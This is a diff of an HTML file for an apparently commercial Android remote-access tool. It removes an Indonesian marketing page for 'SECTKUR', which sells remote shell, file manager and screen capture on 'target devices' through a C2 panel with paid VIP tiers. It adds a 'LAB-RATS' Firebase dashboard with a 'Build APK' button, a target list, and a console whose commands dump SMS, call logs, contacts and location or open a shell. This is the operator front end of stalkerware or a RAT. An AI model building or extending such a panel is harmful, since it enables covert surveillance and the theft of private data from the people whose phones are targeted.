@@ -1,59 +1,21 @@
-<!DOCTYPE html>
-<html lang="id">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>SECTKUR — Cyber-Occult Control Panel</title>
-<link rel="stylesheet" href="/css/style.css">
-<link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>⛧</text></svg>">
-</head>
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Dashboard</title><link rel="stylesheet" href="css/style.css"><script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-app-compat.js"></script><script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-database-compat.js"></script><script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-auth-compat.js"></script><script src="js/firebase-config.js"></script></head>
 <body>
-<div class="container">
-<nav class="nav">
-<div class="logo glitch">SECTKUR <span class="badge-verified" data-tooltip="Sistem terverifikasi resmi. SSL aktif.">✓</span></div>
-<a href="/login" class="btn-primary" style="padding:0.5rem 1rem;font-size:0.8rem;">Masuk / Daftar</a>
-</nav>
-<section class="hero">
-<h1>KENDALIKAN DARI KEGELAPAN</h1>
-<p class="tagline">SECTKUR adalah platform kontrol jarak jauh berbasis web yang menghubungkan Anda ke perangkat target melalui WebSocket C2 terenkripsi. Satu <code style="color:var(--blood)">appuid</code>, kendali penuh, tanpa batas jarak.</p>
-<a href="/login" class="btn-primary" style="font-size:1rem;padding:1rem 2.5rem;">BUKA GERBANG</a>
-</section>
-<section class="section">
-<h2>APA ITU SECTKUR?</h2>
-<p>SECTKUR (dari kata <em>sector</em> dan <em>darkness</em>) adalah panel kontrol berbasis web yang berjalan sepenuhnya di cloud. Ia menjadi jembatan antara Anda dan aplikasi target yang terpasang di perangkat mana pun — dekat maupun jauh.</p>
-<p>Setiap pengguna memiliki <strong style="color:var(--blood)">appuid</strong> unik yang terhubung langsung ke Firebase. Tempelkan <code style="color:var(--blood)">appuid</code> tersebut ke aplikasi target, dan panel ini otomatis mendeteksi koneksi perangkat Anda — tanpa perlu konfigurasi jaringan, tanpa port forwarding, tanpa IP publik.</p>
-</section>
-<section class="section">
-<h2>CARA KERJA SISTEM</h2>
-<div class="grid grid-3">
-<div class="step"><div class="step-num">01</div><h3>Daftar Akun</h3><p>Buat akun gratis. Sistem otomatis membuat <code style="color:var(--blood)">appuid</code> unik yang terikat ke akun Anda.</p></div>
-<div class="step"><div class="step-num">02</div><h3>Pasang appuid</h3><p>Salin <code style="color:var(--blood)">appuid</code> dari dashboard, tempelkan ke kolom <code>appuid</code> di aplikasi target yang sudah terpasang di perangkat.</p></div>
-<div class="step"><div class="step-num">03</div><h3>Free Trial 1 Jam</h3><p>Nikmati akses penuh selama 1 jam pertama. Timer countdown real-time tampil di dashboard Anda.</p></div>
-<div class="step"><div class="step-num">04</div><h3>Upgrade VIP</h3><p>Setelah trial habis, upgrade ke VIP via QRIS. Akses tanpa batas waktu, semua fitur terbuka.</p></div>
-</div>
-</section>
-<section class="section">
-<h2>TRIAL VS VIP</h2>
-<table class="compare-table">
-<thead><tr><th>Fitur</th><th>Trial (1 Jam)</th><th>VIP (Unlimited)</th></tr></thead>
-<tbody>
-<tr><td>Koneksi ke perangkat target</td><td class="yes">✓</td><td class="yes">✓</td></tr>
-<tr><td>Durasi akses</td><td class="no">1 jam</td><td class="yes">Tanpa batas</td></tr>
-<tr><td>Remote shell / command</td><td class="yes">✓</td><td class="yes">✓</td></tr>
-<tr><td>File manager</td><td class="no">✗</td><td class="yes">✓</td></tr>
-<tr><td>Screen capture</td><td class="no">✗</td><td class="yes">✓</td></tr>
-<tr><td>Multi-device (lebih dari 1 target)</td><td class="no">✗</td><td class="yes">✓</td></tr>
-<tr><td>Priority support</td><td class="no">✗</td><td class="yes">✓</td></tr>
-</tbody>
-</table>
-</section>
-<section class="section">
-<h2>TENTANG &amp; KONTAK</h2>
-<p>SECTKUR dikembangkan oleh <strong>K4N3CO-LABS</strong>. Platform ini dirancang untuk riset keamanan, pengujian penetrasi, dan kontrol perangkat pribadi yang Anda miliki sendiri.</p>
-<p>Butuh bantuan? Hubungi developer via Telegram atau email yang tertera di dashboard setelah login.</p>
-<div class="mt-3"><a href="/login" class="btn-primary">MULAI SEKARANG</a></div>
-</section>
-<div style="padding:2rem 0;text-align:center;color:var(--text-dim);font-size:0.75rem;border-top:1px solid var(--border);">© 2026 SECTKUR — K4N3CO-LABS. All rights reserved.</div>
-</div>
-</body>
-</html>
+<header class="dashboard-header">
+  <div class="logo">◆ LAB-RATS</div>
+  <div style="display:flex; align-items:center; gap:1.5rem;">
+    <a href="#" id="dev-link" class="hidden" style="color:#f85149; font-weight:bold; border:1px solid #f85149; padding:0.4rem 1rem; border-radius:8px;">🛡️ DEV PANEL</a>
+    <button id="btn-build" class="btn" style="width:auto; padding:0.4rem 1rem; background:#58a6ff; color:#0a0c10; font-weight:bold;" onclick="buildAPK(event)">⚡ Build APK</button>
+    <a href="upgrade.html" style="color:#3fb950; font-weight:600;">Upgrade</a>
+    <div class="profile-section"><div class="avatar" id="avatar-init">A</div><div><div style="font-size:0.9rem;" id="user-email">Loading...</div><div style="font-size:0.75rem; color:#8b949e;" id="user-role">Basic</div><div style="font-size:0.75rem; color:#f85149;" id="user-expired"></div></div></div>
+    <button class="btn btn-outline" style="width:auto; padding:0.4rem 1rem;" onclick="firebase.auth().signOut().then(()=>window.location.href='login.html')">Logout</button>
+  </div>
+</header>
+<main class="main-content">
+  <div id="banned-screen" class="hidden" style="text-align:center; padding: 5rem 2rem;"><h1 style="color:#f85149; font-size:3rem;">🚫 ACCOUNT BANNED</h1></div>
+  <div id="dashboard-content">
+    <div style="display:flex; justify-content:space-between; align-items:center;"><h2>My Targets</h2><div style="display:flex; gap:1rem;"><span class="role-badge">Online: <span id="online-count">0</span></span><span class="role-badge" style="background:#21262d; color:#c9d1d9;">Total: <span id="total-count">0</span></span></div></div>
+    <div id="device-list" class="device-grid"><p style="color:#8b949e;">Belum ada target.</p></div>
+    <div id="console-panel" class="panel hidden"><div style="display:flex; justify-content:space-between; margin-bottom:1rem;"><h3 id="console-title">Console</h3><button class="btn btn-outline" style="width:auto; padding:0.2rem 0.8rem;" onclick="document.getElementById('console-panel').classList.add('hidden')">Tutup</button></div><div style="display:flex; gap:0.5rem; margin-bottom:1rem;"><select id="cmd-action" style="flex:1; padding:0.6rem; background:#161b22; color:#fff; border:1px solid #30363d; border-radius:6px;"><option value="sms_dump">SMS Dump</option><option value="call_log_dump">Call Log</option><option value="contacts_dump">Contacts</option><option value="location">Location</option><option value="shell">Shell</option></select><input type="text" id="cmd-args" placeholder="Args" style="flex:2; padding:0.6rem; background:#161b22; color:#fff; border:1px solid #30363d; border-radius:6px;"><button class="btn" style="width:auto;" onclick="sendCommand()">Send</button></div><pre id="output-box" style="background:#010409; padding:1rem; border-radius:6px; color:#3fb950; min-height:200px; overflow:auto;">Waiting...</pre></div>
+  </div>
+</main>
+<script src="js/panel.js"></script></body></html>
